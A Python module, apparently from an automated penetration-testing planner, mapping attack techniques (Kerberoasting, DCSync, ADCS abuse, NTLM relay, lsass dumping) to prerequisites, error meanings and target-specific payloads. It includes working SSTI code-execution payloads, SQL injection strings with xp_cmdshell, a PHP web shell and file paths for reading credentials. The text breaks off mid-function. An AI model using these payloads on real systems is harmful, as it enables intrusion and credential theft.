#!/usr/bin/env python3
"""
technique_advisor.py — Technique-specific reasoning engine for TAR.

Bridges world model state → HackTricks/PAT knowledge → actionable guidance.
Provides:
  1. Prerequisites: what MUST be true before a technique works
  2. Failure interpretation: what does this error mean for this technique
  3. Adaptation: conditional technique selection from PAT
  4. Mechanism briefs: 2-3 sentence explanation from HackTricks

Usage:
    python3 technique_advisor.py prerequisites kerberoast
    python3 technique_advisor.py failure kerberoast "No entries found"
    python3 technique_advisor.py mechanism certipy
    python3 technique_advisor.py adapt ssti --stack "Python Flask Jinja2"
"""

import re
import sys
from pathlib import Path
from typing import Dict, List, Optional, Tuple

sys.path.insert(0, str(Path(__file__).parent))

from knowledge_index import get_index, TECHNIQUE_ALIASES

# ══���═══════════════════════════════════════════════════════════════
# Curated prerequisite knowledge — from HackTricks, not guesses
# These encode "what must be true" for a technique to work.
# Structured as: action → list of (predicate_check, human_description, remediation)
# ══════���═════════════════════════════════���═════════════════════════

PREREQUISITES = {
    # AD / Kerberos
    "kerberoast": [
        ("service.port==88", "Kerberos (port 88) must be reachable", "Run nmap to confirm port 88 is open"),
        ("has_domain_cred", "Any valid domain credential required (user:pass or user:hash)", "Enumerate users first, try AS-REP roasting for hashless accounts"),
        ("has_spn_users", "SPN users must exist in domain (non-machine accounts with ServicePrincipalName set)", "Run GetUserSPNs with -no-preauth or ldapsearch for servicePrincipalName"),
    ],
    "asreproast": [
        ("service.port==88", "Kerberos (port 88) must be reachable", "Run nmap to confirm port 88 is open"),
        ("has_userlist", "Need list of domain usernames to test", "Enumerate users via RID brute, kerbrute, or ldapsearch"),
    ],
    "dcsync": [
        ("service.port==88", "Kerberos must be reachable", ""),
        ("has_admin_cred", "Need account with Replicating Directory Changes rights (Domain Admin, or explicit delegation)", "Check with secretsdump first; if ACCESS_DENIED, escalate privileges"),
    ],
    "secretsdump": [
        ("has_admin_cred", "Need local admin or domain admin credential", "Escalate to admin first"),
        ("service.port==445", "SMB (port 445) must be reachable", ""),
    ],
    "psexec": [
        ("has_admin_cred", "Local admin credential required on target", "Try pass-the-hash if you have NTLM hash"),
        ("service.port==445", "SMB (port 445) must be reachable", ""),
        ("smb_writable_share", "Need writable share (ADMIN$ or C$)", "Check share permissions with smbclient or crackmapexec"),
    ],
    "wmiexec": [
        ("has_admin_cred", "Admin credential required", ""),
        ("service.port==135", "RPC (port 135) must be reachable", ""),
    ],
    "evil_winrm": [
        ("has_cred", "Valid credential required (password or hash)", ""),
        ("service.port==5985", "WinRM (port 5985/5986) must be reachable", ""),
    ],
    "ntlmrelayx": [
        ("no_smb_signing", "SMB signing must be disabled/not required on target", "Check with crackmapexec: `nxc smb TARGET` — look for 'signing:False'"),
        ("coercion_method", "Need a coercion method that callbacks on port 445 (PrinterBug, PetitPotam with EfsRpcOpenFileRaw)", "DFSCoerce callbacks on port 80, not 445 — wrong for ntlmrelayx default"),
        ("port_445_free", "Port 445 must be free on attacker machine", "Check: ss -tlnp | grep :445"),
    ],
    "responder": [
        ("port_445_free", "Ports 445,80,389 must be free on attacker", "Kill conflicting processes: ss -tlnp | grep -E ':445|:80|:389'"),
        ("same_subnet", "Attacker must be on same broadcast domain for LLMNR/NBT-NS", ""),
    ],
    "petitpotam": [
        ("service.port==445", "Target must have SMB/RPC accessible", ""),
        ("has_listener", "Must have ntlmrelayx or responder listening before coercion", "Start relay/capture first, then coerce"),
    ],
    "certipy": [
        ("has_adcs", "Active Directory Certificate Services must be deployed", "Run `certipy find -u USER -p PASS -dc-ip DC` to discover CAs"),
        ("has_domain_cred", "Domain credential required", ""),
        ("has_vulnerable_template", "Vulnerable certificate template must exist (ESC1-ESC8)", "Run certipy find first to enumerate templates"),
    ],
    "bloodhound": [
        ("has_domain_cred", "Domain credential required for collection", ""),
        ("service.port==389", "LDAP (port 389) must be reachable", ""),
    ],
    "rbcd": [
        ("has_domain_cred", "Domain credential with write access to target's msDS-AllowedToActOnBehalfOfOtherIdentity", "Check ACLs with bloodhound or PowerView"),
        ("has_machine_account", "Need a machine account (or ability to create one via MAQ)", "Check ms-DS-MachineAccountQuota with ldapsearch"),
    ],
    "golden_ticket": [
        ("has_krbtgt_hash", "Need krbtgt NTLM hash (from DCSync or NTDS.dit)", "Run DCSync first"),
        ("has_domain_sid", "Need domain SID", "Get from `whoami /all` or ldapsearch"),
    ],
    "silver_ticket": [
        ("has_service_hash", "Need target service account's NTLM hash", "Kerberoast + crack, or secretsdump"),
        ("has_domain_sid", "Need domain SID", ""),
    ],

    # Web
    "sqli": [
        ("service.port==80", "Web service must be accessible", ""),
        ("has_injectable_param", "Need identified injection point (parameter, header, cookie)", "Test with single quote or sqlmap --crawl"),
    ],
    "sqli_union": [
        ("service.port==80", "Web service must be accessible", ""),
        ("sqli_confirmed", "SQL injection must be confirmed first", "Test with error-based or boolean-based detection first"),
        ("union_column_count", "Must determine number of columns for UNION", "Use ORDER BY incrementing: ORDER BY 1, ORDER BY 2, ..."),
    ],
    "ssti": [
        ("service.port==80", "Web service must be accessible", ""),
        ("has_template_injection_point", "Need input reflected in template rendering", "Test with {{7*7}} or ${7*7} — if 49 appears, SSTI confirmed"),
        ("template_engine_identified", "Must identify template engine (Jinja2/Twig/Freemarker/etc)", "Use polyglot: {{7*'7'}} → 7777777 means Jinja2"),
    ],
    "ssrf": [
        ("service.port==80", "Web service must be accessible", ""),
        ("has_url_param", "Need parameter that fetches/includes URLs", "Look for url=, path=, redirect=, next=, file= parameters"),
    ],
    "lfi": [
        ("service.port==80", "Web service must be accessible", ""),
        ("has_file_param", "Need parameter that includes local files", "Test with ../../../../etc/passwd"),
    ],
    "file_upload": [
        ("service.port==80", "Web service must be accessible", ""),
        ("has_upload_form", "Need file upload functionality", "Enumerate web application forms"),
    ],
    "xxe": [
        ("service.port==80", "Web service must be accessible", ""),
        ("accepts_xml", "Application must parse XML input", "Check Content-Type: application/xml, or file upload accepting XML/SVG/DOCX"),
    ],
    "deserialization": [
        ("service.port==80", "Web service must be accessible", ""),
        ("has_serialized_data", "Must identify serialized object in request (Java/PHP/Python/.NET)", "Look for base64 blobs, viewstate, cookies with rO0AB (Java), O: (PHP)"),
    ],

    # Services
    "hydra": [
        ("has_target_service", "Target service must be accessible (SSH/FTP/HTTP/etc)", "Confirm port open with nmap"),
        ("has_userlist_or_user", "Need username or username list", "Enumerate users first"),
    ],
    "ftp_anon": [
        ("service.port==21", "FTP (port 21) must be open", ""),
    ],
    "ssh": [
        ("service.port==22", "SSH (port 22) must be open", ""),
        ("has_cred", "Need valid credential (password, key, or hash for ProxyCommand)", ""),
    ],
    "mysql": [
        ("service.port==3306", "MySQL (port 3306) must be open", ""),
    ],
    "mssql": [
        ("service.port==1433", "MSSQL (port 1433) must be open", ""),
    ],
    "redis": [
        ("service.port==6379", "Redis (port 6379) must be open", ""),
    ],
    "ldapsearch": [
        ("service.port==389", "LDAP (port 389) must be open", ""),
    ],
    "snmp": [
        ("service.port==161", "SNMP (port 161/UDP) must be open", ""),
    ],

    # Privesc
    "potato": [
        ("has_shell", "Must have shell on Windows target", ""),
        ("has_seimpersonate", "Need SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege", "Check: whoami /priv"),
    ],
    "printspoofer": [
        ("has_shell", "Must have shell on Windows target", ""),
        ("has_seimpersonate", "Need SeImpersonatePrivilege", "Check: whoami /priv"),
    ],
    "suid": [
        ("has_shell", "Must have shell on Linux target", ""),
    ],
    "sudo": [
        ("has_shell", "Must have shell on Linux target", ""),
        ("has_cred", "Need current user's password for sudo -l (unless NOPASSWD)", ""),
    ],

    # ── OCD mindmap additions (v2.1) ──
    "certifried": [
        ("has_cred", "Need any domain user credential", ""),
        ("machine_account_quota_positive", "MachineAccountQuota > 0 or WriteProperty on existing computer", "Check: ldapsearch ms-DS-MachineAccountQuota"),
        ("write_access_dns_hostname", "WriteProperty on dNSHostName of target computer", "BloodHound: ComputerAccount→WriteDnsHostName"),
    ],
    "skeleton_key": [
        ("local_system_on_dc", "Must be SYSTEM on a Domain Controller", "Prerequisite is typically DA → lsadump::lsa /inject"),
        ("mimikatz_available", "Need mimikatz (or reflective DLL loader) executable on DC", "AV/EDR bypass likely required"),
    ],
    "dsrm_password": [
        ("local_system_on_dc", "Must be SYSTEM on a DC", ""),
        ("write_hklm_registry", "Need HKLM\\System\\CurrentControlSet\\Control\\Lsa write", ""),
    ],
    "dc_shadow": [
        ("domain_admin", "Need DA or equivalent (WriteDacl on domain + Replicating Directory Changes)", ""),
        ("mimikatz_available", "mimikatz !+ driver on attacker box", ""),
    ],
    "custom_ssp": [
        ("local_system_on_dc", "Must be SYSTEM on a DC", ""),
        ("write_hklm_registry", "Need HKLM\\System\\CurrentControlSet\\Control\\Lsa\\Security Packages write", ""),
    ],
    "saphire_ticket": [
        ("krbtgt_hash", "Need krbtgt NTLM hash", "Obtained via dcsync"),
        ("target_user_sid", "Need target user's SID and PAC fields", ""),
    ],
    "blind_kerberoast": [
        ("has_cred", "Need any domain user cred (LDAP read)", ""),
        ("writable_msds_allowed_to_delegate_to_or_spn", "Write access to target user's servicePrincipalName OR add-then-roast variant", "Check BloodHound WriteProperty on User"),
    ],
    "nopac": [
        ("has_cred", "Need any domain user cred", ""),
        ("machine_account_quota_positive", "MachineAccountQuota must be > 0 (default is 10)", "Check: ldapsearch ms-DS-MachineAccountQuota"),
        ("dc_unpatched_cve_2021_42287", "DC must be unpatched (pre-Nov 2021)", "Check: Test patch by running the exploit in dry mode"),
    ],
    "privexchange": [
        ("has_cred", "Need any domain mailbox account", ""),
        ("exchange_vulnerable", "Exchange Server pre-CU fix (Feb 2019 or earlier)", ""),
    ],
    "dnsadmins": [
        ("member_dnsadmins", "User must be in DNSAdmins group", "Check: whoami /groups"),
        ("write_dnscmd_dll", "Need writable filesystem path for dnscmd /ServerLevelPluginDll", ""),
    ],
    "adcs_esc9": [
        ("has_cred", "Need any domain user cred", ""),
        ("write_access_upn_or_sid", "WriteProperty on victim's userPrincipalName", "BloodHound: GenericWrite/GenericAll"),
        ("template_no_sec_ext", "Template has CT_FLAG_NO_SECURITY_EXTENSION set", "Check: certipy find -vulnerable"),
    ],
    "adcs_esc10": [
        ("has_cred", "Need any domain user cred", ""),
        ("write_access_upn", "WriteProperty on victim's UPN", ""),
        ("dc_weak_cert_mapping", "DC: StrongCertificateBindingEnforcement=0 or CertificateMappingMethods allows UPN", "Check: registry KDC\\StrongCertificateBindingEnforcement"),
    ],
    "adcs_esc13": [
        ("has_cred", "Need any domain user cred", ""),
        ("enroll_right_oid_template", "Enroll right on template with linked msDS-OIDToGroupLink", "Check: certipy find -vulnerable | grep ESC13"),
    ],
    "adcs_esc14": [
        ("has_cred", "Need any domain user cred", ""),
        ("write_alt_security_identities", "WriteProperty on victim's altSecurityIdentities", "BloodHound: GenericWrite/WriteProperty"),
    ],
    "adcs_esc15": [
        ("has_cred", "Need any domain user cred", ""),
        ("enroll_right_v1_template", "Enroll right on a Schema v1 template", "Check: certipy find -vulnerable | grep v1"),
    ],
    "passthecert": [
        ("has_pfx", "Need a PFX file + password (from ADCS compromise)", ""),
    ],
    "krbrelayup": [
        ("local_user_on_domain_host", "Local user session on a domain-joined host", ""),
        ("machine_account_quota_positive", "MachineAccountQuota > 0 OR ownership of the computer account", ""),
    ],
    "trust_key_extract": [
        ("domain_admin", "Need DA in source domain (or dcsync rights)", ""),
        ("trust_to_target_forest", "An outbound or bidirectional trust to the target forest/domain", "Check: nltest /domain_trusts"),
    ],
    "trust_ticket_forge": [
        ("trust_key_extracted", "Must have the inter-realm trust key from trust_key_extract", ""),
        ("target_enterprise_admin_sid", "Need Enterprise Admins SID in target forest", ""),
    ],
    "msol_password": [
        ("local_system_on_aadconnect_server", "SYSTEM on Azure AD Connect server", ""),
        ("sql_localdb_running", "LocalDB instance ADSync must be running", "Typically always on AAD Connect box"),
    ],
    "keepass_dump": [
        ("shell_obtained", "Code execution on a host where KeePass.exe is running", ""),
        ("keepass_version_vulnerable", "KeePass 2.x older than 2.54", "CVE-2023-32784"),
    ],
    "targetedkerberoast": [
        ("has_cred", "Need any domain user cred", ""),
        ("write_property_on_user", "WriteProperty on target user (to set SPN temporarily)", ""),
    ],
    "timeroast": [
        ("ntp_reachable", "UDP/123 reachable to DC", "No credentials needed"),
    ],
    "goldenpac_ms14068": [
        ("has_cred", "Any domain user cred", ""),
        ("dc_unpatched_ms14_068", "DC must be legacy Server 2003/2008R2 unpatched", ""),
    ],
    "gpp_password": [
        ("has_cred", "Any domain user can read SYSVOL", ""),
        ("sysvol_readable", "Standard domain; readable by authenticated users", ""),
    ],
    # SCCM
    "sccm_find": [
        ("has_cred", "Any domain user", ""),
    ],
    "sccm_pxe_hashcap": [
        ("attacker_on_subnet", "Attacker must be L2-adjacent to trigger DHCP/PXE broadcast", ""),
        ("sccm_dp_pxe_enabled", "SCCM DP must have PXE enabled", ""),
    ],
    "sccm_naa_extract": [
        ("has_cred", "Any domain user cred", ""),
        ("sccm_mp_identified", "Site code + MP hostname from sccm_find", ""),
    ],
    "sccm_client_push": [
        ("has_cred", "Any domain user cred", ""),
        ("client_push_enabled", "Automatic Client Push must be enabled + Fallback to NTLM allowed", ""),
    ],
    "sccm_mssql_relay": [
        ("coercion_method_available", "Need PetitPotam/DFSCoerce reachable on the site server", ""),
    ],
    # Privesc (Windows)
    "remotepotato0": [
        ("another_user_logged_in", "Second interactive user must be logged on (for cross-session coercion)", ""),
        ("rpc_135_reachable", "Attacker-controlled host on port 135 for OXID redirection", ""),
    ],
    "roguepotato": [
        ("se_impersonate_privilege", "SeImpersonatePrivilege (service-account)", "whoami /priv"),
        ("rpc_135_redirect_host", "Attacker-controlled host reachable on port 135", ""),
    ],
    "uac_bypass_fodhelper": [
        ("is_local_admin_uac_medium", "Medium-integrity member of local Administrators", ""),
    ],
    "uac_bypass_wsreset": [
        ("is_local_admin_uac_medium", "Medium-integrity member of local Administrators", ""),
    ],
    "applocker_bypass_msbuild": [
        ("applocker_enabled", "AppLocker policy is the blocker to bypass", "Check: Get-AppLockerPolicy -Effective"),
    ],
    "serioussam": [
        ("unpatched_cve_2021_36934", "Windows 10 1809+ without the Aug 2021 patch", ""),
        ("vss_available", "At least one Volume Shadow Copy must exist", "vssadmin list shadows"),
    ],
    "smbghost": [
        ("service.port==445", "SMB reachable", ""),
        ("smbv3_compression_enabled", "SMBv3 compression enabled on target (Win10 1903/1909)", ""),
    ],
    # Services / quick wins
    "eternalblue": [
        ("service.port==445", "SMB reachable", ""),
        ("smbv1_enabled", "Target accepts SMBv1", ""),
    ],
    "veeam_cve2024_40711": [
        ("service.port==9401", "Veeam B&R Manager endpoint reachable", ""),
    ],
    # Creds
    "lsass_procdump": [
        ("is_local_admin", "Local Administrator (or SYSTEM)", ""),
        ("se_debug_privilege", "SeDebugPrivilege enabled (default for Admins)", ""),
        ("no_lsa_protection", "LSA RunAsPPL disabled — otherwise PPL bypass required", ""),
    ],
    "lsass_comsvcs": [
        ("is_local_admin", "Local Administrator or SYSTEM", ""),
        ("no_lsa_protection", "LSA RunAsPPL disabled", ""),
    ],
    "mscache2_dump": [
        ("is_local_admin", "Local Administrator (to save SECURITY hive)", ""),
    ],
    "dpapi_masterkey": [
        ("user_masterkey_file", "Access to user's %APPDATA%\\Microsoft\\Protect\\<SID>\\", ""),
        ("user_password_or_backup_key", "User password OR DC backup key", ""),
    ],
    "sam_offline_dump": [
        ("is_local_admin", "Local Administrator (to save SAM + SYSTEM hives)", ""),
    ],
    "mitm6": [
        ("attacker_on_subnet", "L2 adjacency on victim VLAN (DHCPv6 is link-scope)", ""),
        ("no_ra_guard", "Switch RA/DHCPv6 guard must not be enforcing", ""),
    ],
    "ntlm_theft_file_drop": [
        ("has_cred", "Any cred that can write to the share", ""),
        ("writable_share_found", "A writable file share browsed by potential victims", ""),
    ],
}

# ═══════════════════════��══════════════════════════════════════════
# Failure patterns — what errors mean for specific techniques
# ═���══════════════════════════���═════════════════════════��═══════════

FAILURE_PATTERNS = {
    "kerberoast": {
        "No entries found": "No SPN users in domain. All service accounts may use machine accounts (no roastable SPNs). Try: ldapsearch for servicePrincipalName, or targeted kerberoast via GenericWrite.",
        "KDC_ERR_S_PRINCIPAL_UNKNOWN": "The requested SPN does not exist. Service may have been decommissioned. Enumerate SPNs again.",
        "KRB_AP_ERR_SKEW": "Clock skew >5 minutes between attacker and DC. Fix: sudo ntpdate -s DC_IP",
        "KDC_ERR_C_PRINCIPAL_UNKNOWN": "Your user account doesn't exist in the domain. Credential may be wrong or user deleted.",
        "LOGON_FAILURE": "Credentials rejected. Password changed or account locked. Verify cred with: nxc smb DC -u USER -p PASS",
    },
    "asreproast": {
        "No entries found": "No accounts with 'Do not require Kerberos pre-authentication' set. This is common in hardened environments.",
        "KRB_AP_ERR_SKEW": "Clock skew >5 minutes. Fix: sudo ntpdate -s DC_IP",
    },
    "secretsdump": {
        "ACCESS_DENIED": "Account lacks admin rights on target. Need local admin for SAM/LSA, Domain Admin/DCSync rights for NTDS. Try: nxc smb TARGET -u USER -p PASS to verify admin.",
        "LOGON_FAILURE": "Credentials rejected. Verify with crackmapexec first.",
        "STATUS_NOT_SUPPORTED": "Target may not support the requested protocol version. Try -use-vss flag.",
    },
    "psexec": {
        "ACCESS_DENIED": "Not admin on target, or ADMIN$/C$ share not writable. Try: smbclient //TARGET/ADMIN$ -U USER for manual check.",
        "STATUS_SHARING_VIOLATION": "Another process has the service file locked. Wait or try wmiexec instead.",
        "LOGON_FAILURE": "Bad credentials. Verify first.",
    },
    "ntlmrelayx": {
        "empty_output": "No incoming NTLM auth captured. Causes: (1) coercion method doesn't callback on port 445, (2) attacker port 445 occupied by another process, (3) target SMB signing enabled. Check: ss -tlnp | grep :445",
        "KRB_AP_ERR_SKEW": "Clock skew between machines. Fix: ntpdate -s TARGET",
        "signing is required": "Target has SMB signing required — relay to SMB won't work. Try: relay to LDAP/LDAPS instead, or find unsigned targets.",
    },
    "responder": {
        "empty_output": "No LLMNR/NBT-NS queries captured. Causes: (1) No DNS failures happening, (2) wrong network interface, (3) LLMNR disabled via GPO.",
        "DC$": "Captured machine account (DC$). This is normal — DC queries itself during logon scripts. Can't crack machine hashes. Relay them instead.",
    },
    "certipy": {
        "No CAs found": "No Certificate Authority in domain. ADCS not deployed — certipy attacks not applicable.",
        "Access denied": "Account lacks enrollment rights on target template. Check template ACLs.",
        "CERTSRV_E_TEMPLATE_DENIED": "Template enrollment denied. Template may require specific group membership.",
    },
    "sqli": {
        "no UNION columns found": "UNION injection failed. Try: (1) different column count, (2) blind/time-based instead, (3) check if WAF is blocking UNION keyword.",
        "403": "Web application firewall blocking request. Try: encoding bypass, case variation, comment insertion.",
        "500 Internal Server Error": "SQL syntax error — injection exists but payload malformed. Identify DBMS first (MySQL vs MSSQL vs PostgreSQL) and use correct syntax.",
    },
    "ssti": {
        "empty_output": "Template expression not evaluated. Either: (1) not a template injection point, (2) wrong syntax for this engine, (3) sandboxed. Test with different engines: {{7*7}}, ${7*7}, #{7*7}, <%= 7*7 %>",
        "500": "Syntax error in template. Payload may be wrong for this engine. Identify engine first.",
    },
    "hydra": {
        "0 valid passwords found": "No valid credentials in wordlist. Try: (1) larger wordlist, (2) custom wordlist from gathered intel, (3) different service if multiple ports open.",
        "target does not support": "Service doesn't support this auth method. Check service version and supported auth mechanisms.",
    },
    "bloodhound": {
        "ACCESS_DENIED": "Credential invalid or lacks LDAP read permissions. Any domain user should work — verify cred.",
        "Connection error": "Can't reach LDAP. Check: port 389 open, DNS resolution working, correct DC IP.",
    },
    # ── OCD mindmap additions (v2.1) ──
    "certifried": {
        "STATUS_DUPLICATE_NAME": "Computer name PWNED$ already exists. Pick a new name or delete the old account.",
        "MachineAccountQuota": "ms-DS-MachineAccountQuota is 0 — can't create computer account. Fallback: hijack an existing computer (RBCD via WriteProperty).",
        "ACCESS_DENIED": "No WriteProperty on dNSHostName. Need GenericWrite/GenericAll path from BloodHound.",
    },
    "nopac": {
        "STATUS_USER_EXISTS": "Computer account name collision — pick a different sAMAccountName.",
        "MachineAccountQuota": "Quota exhausted. Need ownership of an existing computer account instead.",
        "patched": "DC is patched against CVE-2021-42278/79. Pivot to RBCD via the same machine account.",
    },
    "skeleton_key": {
        "ERROR_ACCESS_DENIED": "Not SYSTEM on DC, or protected-process on lsass.exe. Need mimikatz driver to bypass PPL.",
        "privilege::debug": "Enable SeDebugPrivilege first: mimikatz> privilege::debug",
    },
    "dc_shadow": {
        "RPC_S_ACCESS_DENIED": "WriteDacl/WriteProperty missing on domain root. Need DA or equivalent with Replicating Directory Changes.",
    },
    "adcs_esc9": {
        "SECURITY_EXTENSION": "Template has security extension enforced (patched post-May 2022) — ESC9 not applicable. Try ESC10 instead.",
        "UPN_MISMATCH": "Victim UPN couldn't be flipped (insufficient rights). Confirm GenericWrite in BloodHound.",
    },
    "adcs_esc15": {
        "EKU rejected": "Target template is Schema v2 or later — EKUwu inapplicable.",
    },
    "krbrelayup": {
        "MachineAccountQuota": "Quota exhausted — use shadow-credentials mode instead of RBCD.",
    },
    "timeroast": {
        "empty": "No NTP response. Target may not run Windows NTP, or UDP/123 filtered.",
    },
    "sccm_naa_extract": {
        "no NAA configured": "Site has no Network Access Account set — skip this path, try PXE or client-push.",
        "ACCESS_DENIED": "MP rejected the policy request. Try a different site/mp or verify cred.",
    },
    "sccm_pxe_hashcap": {
        "PXE disabled": "DP has PXE turned off — no CRED-1 path. Try NAA/HTTP variants.",
        "boot variable empty": "DP returned empty media-variable blob. Site may be patched.",
    },
    "serioussam": {
        "ACCESS_DENIED": "VSS snapshot no longer contains SAM with permissive ACL. Host likely patched (KB5006670).",
    },
    "eternalblue": {
        "STATUS_INVALID_HANDLE": "Target likely patched or non-vulnerable SMB stack. Verify with MS17-010 Metasploit scanner first.",
    },
    "mitm6": {
        "interface not found": "Specified interface doesn't exist. Check: ip link",
        "bind": "Port 547 already in use (another mitm6 or dhcp6c running). Kill the other process.",
    },
    "lsass_procdump": {
        "RunAsPPL": "LSA is protected-process. Need PPL bypass: mimikatz !+ driver, or snapshot via minidump syscall.",
        "credential guard": "Credential Guard enabled — LSASS holds only proxies, not hashes. Need on-disk/DPAPI alternatives.",
    },
}

# ═══════════════════════════���══════════════════════════════════════
# Technique adaptation — conditional selection based on target
# ═════════��════════════════════════════════════════════════════════

ADAPTATIONS = {
    "ssti": {
        "Jinja2": {"payload": "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}", "detect": "{{7*'7'}} → 7777777"},
        "Twig": {"payload": "{{['id']|filter('system')}}", "detect": "{{7*'7'}} → 49"},
        "Freemarker": {"payload": "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex('id')}", "detect": "${7*7} → 49"},
        "Mako": {"payload": "${__import__('os').popen('id').read()}", "detect": "${7*7} → 49"},
        "Pebble": {"payload": "{% set cmd = 'id' %}{% set bytes = (1).TYPE.forName('java.lang.Runtime').methods[6].invoke(null,null).exec(cmd) %}", "detect": ""},
        "ERB": {"payload": "<%= system('id') %>", "detect": "<%= 7*7 %> → 49"},
        "Handlebars": {"payload": "{{#with \"s\" as |string|}}\n{{#with \"e\"}}\n{{this}}\n{{/with}}\n{{/with}}", "detect": ""},
    },
    "sqli": {
        "MySQL": {"union": "' UNION SELECT 1,2,3-- -", "error": "' AND extractvalue(1,concat(0x7e,version()))-- -", "blind": "' AND SLEEP(5)-- -"},
        "MSSQL": {"union": "' UNION SELECT 1,2,3-- ", "error": "' AND 1=CONVERT(int,@@version)-- ", "stacked": "'; EXEC xp_cmdshell 'whoami'-- "},
        "PostgreSQL": {"union": "' UNION SELECT 1,2,3-- ", "error": "' AND 1=CAST(version() AS int)-- ", "stacked": "'; COPY (SELECT '') TO PROGRAM 'id'-- "},
        "SQLite": {"union": "' UNION SELECT 1,2,3-- ", "blind": "' AND CASE WHEN (1=1) THEN 1 ELSE load_extension('x') END-- "},
        "Oracle": {"union": "' UNION SELECT 1,2,3 FROM DUAL-- ", "error": "' AND 1=UTL_INADDR.get_host_name((SELECT banner FROM v$version WHERE rownum=1))-- "},
    },
    "deserialization": {
        "Java": {"detect": "rO0AB or AC ED 00 05 in base64/hex", "tool": "ysoserial", "chains": "CommonsBeanutils1, CommonsCollections1-7, Groovy1"},
        "PHP": {"detect": "O:4: or a:2: serialized format", "tool": "phpggc", "chains": "Laravel, Symfony, WordPress, Guzzle"},
        "Python": {"detect": "pickle, base64-encoded blob", "tool": "manual pickle payload", "chains": "__reduce__, os.system"},
        ".NET": {"detect": "__VIEWSTATE, ObjectStateFormatter", "tool": "ysoserial.net", "chains": "ObjectDataProvider, TypeConfuseDelegate"},
    },
    "file_upload": {
        "PHP": {"extensions": [".php", ".php5", ".phtml", ".phar", ".phps", ".php.jpg"], "magic": "GIF89a;<?php system($_GET['cmd']); ?>"},
        "ASP": {"extensions": [".asp", ".aspx", ".ashx", ".asmx", ".config"], "magic": ""},
        "JSP": {"extensions": [".jsp", ".jspx", ".war"], "magic": ""},
        "Python": {"extensions": [".py"], "magic": ""},
    },
    "lfi": {
        "Linux": {"paths": ["/etc/passwd", "/etc/shadow", "/proc/self/environ", "/proc/self/cmdline", "/var/log/apache2/access.log", "/home/*/.ssh/id_rsa"]},
        "Windows": {"paths": ["C:\\Windows\\System32\\config\\SAM", "C:\\Windows\\win.ini", "C:\\inetpub\\wwwroot\\web.config", "C:\\Users\\*\\.ssh\\id_rsa"]},
        "wrappers": {"php://filter": "php://filter/convert.base64-encode/resource=", "data://": "data://text/plain;base64,", "expect://": "expect://id"},
    },
}


class TechniqueAdvisor:
    """Provides technique-specific reasoning using HackTricks/PAT knowledge."""

    def __init__(self):
        self._index = None

    @property
    def index(self):
        if self._index is None:
            self._index = get_index()
        return self._index

    def get_prerequisites(self, action_name: str) -> List[dict]:
        """Get prerequisites for a technique.

        Returns list of {check, description, remediation}.
        First checks curated prerequisites, then falls back to HackTricks search.
        """
        # Curated prerequisites (high confidence)
        if action_name in PREREQUISITES:
            return [
                {"check": p[0], "description": p[1], "remediation": p[2]}
                for p in PREREQUISITES[action_name]
            ]

        # Fallback: search HackTricks for prerequisite-like content
        keywords = TECHNIQUE_ALIASES.get(action_name, action_name.replace('_', ' '))
        results = self.index.search(f"{keywords} prerequisites requirements", top_n=3)

        prereqs = []
        for r in results:
            # Extract sentences mentioning requirements
            for line in r['text'].split('\n'):
                line_lower = line.lower()
                if any(kw in line_lower for kw in ['requir', 'must', 'need', 'prerequisit', 'before', 'make sure']):
                    clean = line.strip().lstrip('- *>')
                    if len(clean) > 20 and len(clean) < 200:
                        prereqs.append({
                            "check": "manual",
                            "description": clean,
                            "remediation": "",
                        })
            if len(prereqs) >= 5:
                break

        return prereqs[:5]

    def get_failure_interpretation(self, action_name: str, output: str, silence: str = "") -> str:
        """Interpret a failure for a specific technique.

        Args:
            action_name: The action that failed
            output: The tool's stdout/stderr
            silence: Description of the silence pattern (empty = use output)

        Returns human-readable interpretation with next steps.
        """
        combined = (output + ' ' + silence).strip()

        # Check curated failure patterns first
        if action_name in FAILURE_PATTERNS:
            patterns = FAILURE_PATTERNS[action_name]
            for pattern, interpretation in patterns.items():
                if pattern.lower() in combined.lower() or (pattern == "empty_output" and len(combined.strip()) < 10):
                    return interpretation

        # Fallback: search HackTricks for error context
        guidance = self.index.get_failure_guidance(action_name, combined[:100])
        if guidance:
            return f"From knowledge base:\n{guidance}"

        return f"No specific guidance found for {action_name} failure. Review output and check HackTricks for the technique."

    def suggest_adaptation(self, action_name: str, target_profile: dict) -> dict:
        """Suggest technique adaptations based on target profile.

        Args:
            action_name: Base technique (e.g., 'ssti', 'sqli')
            target_profile: {os, services, tech_stack, findings}

        Returns dict with adapted parameters, payloads, or variant selection.
        """
        if action_name not in ADAPTATIONS:
            # Search PAT for technique variations
            keywords = TECHNIQUE_ALIASES.get(action_name, action_name.replace('_', ' '))
            results = self.index.search(keywords, source="pat", top_n=3)
            if results:
                return {
                    "source": "pat_search",
                    "guidance": results[0]['text'][:500],
                    "heading": results[0]['heading'],
                }
            return {}

        adaptations = ADAPTATIONS[action_name]
        tech_stack = target_profile.get('tech_stack', '')
        os_name = target_profile.get('os', '')

        # Match technology stack to adaptation
        matched = {}
        for variant, details in adaptations.items():
            if variant.lower() in tech_stack.lower() or variant.lower() in os_name.lower():
                matched[variant] = details

        if not matched:
            # Return all variants if no match
            return {"variants": adaptations, "note": "Could not auto-detect technology. Test each variant."}

        return {"matched": matched}

    def get_mechanism_brief(self, action_name: str) -> str:
        """Get a 2-3 sentence mechanism explanation from HackTricks.

        More detailed than the YAML one-liner, but concise enough for planner context.
        """
        ctx = self.index.get_technique_context(action_name, max_chars=500)
        if not ctx:
            return ""

        # Extract first 2-3 meaningful sentences
        lines = ctx.split('\n')
        # Skip the source header line
        text_lines = [l for l in lines[1:] if l.strip() and not l.strip().startswith('```') and not l.strip().startswith('|')]
        sentences = []
        for line in text_lines:
            # Split into sentences
            for sent in re.split(r'(?<=[.!?])\s+', line):
                sent = sent.strip()
                if len(sent) > 30:
                    sentences.append(sent)
                if len(sentences) >= 3:
                    break
            if len(sentences) >= 3:
                break

        return ' '.join(sentences) if sentences else ctx[:300]

    def check_prerequisites_against_state(self, action_name: str, state: dict) -> Tuple[bool, List[str]]:
        """Check if all prerequisites are met given current world model state.

        Args:
            state: {ports: [22, 80, ...], has_cred: bool, has_admin_cred: bool,
                    has_domain_cred: bool, os: str, predicates: set, ...}

        Returns (all_met, list_of_unmet_descriptions)
        """
        prereqs = self.get_prerequisites(action_name)
        if not prereqs:
            return True, []

        unmet = []
        ports = set(state.get('ports', []))
        predicates = set(state.get('predicates', []))

        for p in prereqs:
            check = p['check']
            met = False

            if check == 'manual':
